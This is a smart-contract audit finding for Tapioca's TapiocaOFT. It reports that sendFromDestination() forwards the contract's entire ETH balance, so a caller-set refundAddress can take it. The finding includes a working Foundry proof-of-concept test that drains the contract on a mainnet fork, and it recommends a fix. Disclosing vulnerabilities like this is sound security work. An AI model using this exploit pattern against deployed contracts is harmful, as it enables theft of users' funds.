---
id: 25661
severity: "Crit/High"
---

# triggerSendFrom() will send all the ETH in the destination chain where sendFrom() is called to the refundAddress in the LzCallParams argument

## Description



## Proof of Concept

`sendFrom()` uses the `msg.value` as native fees to LayerZero, being the excess sent refunded to the `refundAddress`. In `BaseTOFTOptionsModule`, `sendFromDestination()`, which is called when there was a `triggerSendFrom()` from a source chain which is delivered to the current chain, the value sent to the `sendFrom()` function is `address(this).balance`:

function sendFromDestination(bytes memory _payload) public { ... ISendFrom(address(this)).sendFrom{value: address(this).balance}( from, lzDstChainId, LzLib.addressToBytes32(from), amount, callParams ); ... }

This means that all the balance but the LayerZero message fee will be refunded to the `refundAddress` in the `callParams`, as can be seen in the `sendFrom()` function:

```solidity
    function sendFrom(address _from, uint16 _dstChainId, bytes32 _toAddress, uint _amount, LzCallParams calldata _callParams) public payable virtual override {
        _send(_from, _dstChainId, _toAddress, _amount, _callParams.refundAddress, _callParams.zroPaymentAddress, _callParams.adapterParams);
    }
```

The following POC shows that a user that specifies the `refundAddress` as its address will receive all the ETH balance in the `TapiocaOFT` contract minus the LayerZero message fee.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";

import {TapiocaOFT} from "contracts/tOFT/TapiocaOFT.sol";
import {BaseTOFTOptionsModule} from "contracts/tOFT/modules/BaseTOFTOptionsModule.sol";

import {IYieldBoxBase} from "tapioca-periph/contracts/interfaces/IYieldBoxBase.sol";
import {ISendFrom} from "tapioca-periph/contracts/interfaces/ISendFrom.sol";
import {ICommonData} from "tapioca-periph/contracts/interfaces/ICommonData.sol";

contract TapiocaOFTPOC is Test {
    address public constant LZ_ENDPOINT =
        0x66A71Dcef29A0fFBDBE3c6a460a3B5BC225Cd675;
    uint16 public constant PT_SEND_FROM = 778;

    function test_POC_TriggerSendFrom_StealAllEth() public {
        vm.createSelectFork("https://eth.llamarpc.com");

        address optionsModule_ = address(new BaseTOFTOptionsModule(address(LZ_ENDPOINT), address(0), IYieldBoxBase(address(2)), "SomeName", "SomeSymbol", 18, block.chainid));

        TapiocaOFT tapiocaOft_ = new TapiocaOFT(
            LZ_ENDPOINT,
            address(0),
            IYieldBoxBase(address(3)),
            "SomeName",
            "SomeSymbol",
            18,
            block.chainid,
            payable(address(1)),
            payable(address(2)),
            payable(address(3)),
            payable(optionsModule_)
        );

        address user_ = makeAddr("user");
        deal(user_, 2 ether);
        deal(address(tapiocaOft_), 10 ether);
        vm.prank(user_);
        tapiocaOft_.wrap{value: 1 ether}(user_, user_, 1 ether);

        uint16 lzDstChainId_ = 102;
        bytes memory airdropAdapterParams_;
        address zroPaymentAddress_ = address(0);
        uint256 amount_ = 1;
        ISendFrom.LzCallParams memory sendFromData_;
        sendFromData_.refundAddress = payable(user_);
        ICommonData.IApproval[] memory approvals_;

        tapiocaOft_.setTrustedRemoteAddress(102, abi.encodePacked(tapiocaOft_));

        // triggerSendFrom goes through with refundAddress = user_ in the SendFrom call in the destination chain
        vm.prank(user_);
        tapiocaOft_.triggerSendFrom{value: 1 ether}(
            lzDstChainId_,
            airdropAdapterParams_,
            zroPaymentAddress_,
            amount_,
            sendFromData_,
            approvals_
        );

        bytes memory lzPayload_ = abi.encode(
            PT_SEND_FROM,
            user_,
            amount_,
            sendFromData_,
            102,
            approvals_
        );

        vm.prank(user_);
        tapiocaOft_.approve(address(tapiocaOft_), amount_); // user has to approve the tOFT contract to spend their tokens in the SendFrom call

        vm.prank(LZ_ENDPOINT);
        tapiocaOft_.lzReceive(102, abi.encodePacked(tapiocaOft_, tapiocaOft_), 0, lzPayload_);
        assertGt(user_.balance, 10 ether); // user received the whole balance of the tOFT contract due to the refund
    }
}
```

## Recommendation

The value sent in the `sendFrom()` call in the `BaseTOFTOptionsModule` should be sent and forwarded from the `triggerSendFrom()` call in the source chain. This way, the user pays the fees from the source chain.
